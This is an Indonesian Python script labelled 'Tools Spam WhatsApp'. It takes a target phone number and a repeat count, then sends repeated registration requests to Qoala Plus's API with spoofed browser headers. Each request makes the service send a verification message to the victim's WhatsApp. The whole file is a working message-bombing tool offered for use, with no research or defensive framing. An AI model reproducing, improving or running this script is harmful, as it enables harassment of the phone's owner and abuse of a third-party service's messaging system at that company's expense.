import requests,json,os



os.system("clear")


print("Tools Spam WhatsApp")
print("NOTE : Maksimal 5x Spam")
print("[=] Youtube : START8HILMI [=]")
print("[=] Author : START8HILMI [=]")
print("[=] Created : START8HILMI [=]")
nomer = input("Nomer Target : ")
jumlah = int(input("Jumlah Spam : "))
for i in range(jumlah):
  head = {
  "Host": "api.qoalaplus.com",
  "content-length": "48",
  "accept": "application/json, text/plain, */*",
  "user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
  "content-type": "application/json",
  "origin": "https://www.qoalaplus.com",
  "sec-fetch-site": "same-site",
  "sec-fetch-mode": "cors",
  "sec-fetch-dest": "empty",
  "referer": "https://www.qoalaplus.com/",
  "accept-encoding": "gzip, deflate, br",
  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
  data = json.dumps({"phone_number":"+62"+nomer,"channel":"WA"})
  pos = requests.post("https://api.qoalaplus.com/go-agent/v2/user/register",headers=head,data=data).text
  if "success" in pos:
    print("Spam WhatsApp Qoala Plus Berhasil")
  else:
    print("Spam WhatsApp Qoala Plus Gagal Ke")
